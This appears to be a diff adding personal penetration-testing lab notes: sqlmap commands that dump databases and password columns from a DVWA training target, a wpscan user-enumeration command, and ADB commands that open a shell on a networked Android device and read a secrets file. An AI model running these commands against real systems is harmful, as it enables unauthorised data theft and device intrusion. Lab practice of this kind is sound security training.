@@ -1,0 +1,24 @@
+Command Injection:
+
+SQL Injection:
+sqlmap --url "http://192.168.54.131/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs    [It will not work]
+capture the get request in burp-->Right click-->Save item
+
+Dave it like request.txt
+sqlmap -r request.txt --dbs
+sqlmap -r request.txt -D dvwa --tables
+sqlmap -r request.txt -D dvwa -T users --columns
+sqlmap -r request.txt -D dvwa -T users -C password --dump
+sqlmap -r request.txt -D dvwa --dump
+
+Wordpress:
+wpscan --url  http://10.10.14.12/ -enumerate -u
+
+ADB:
+adb connect 192.168.0.100:5555
+adb devices    [to check the reachable devices]
+adb shell
+ls
+whoami
+cd sdcard/
+cat secret.txt
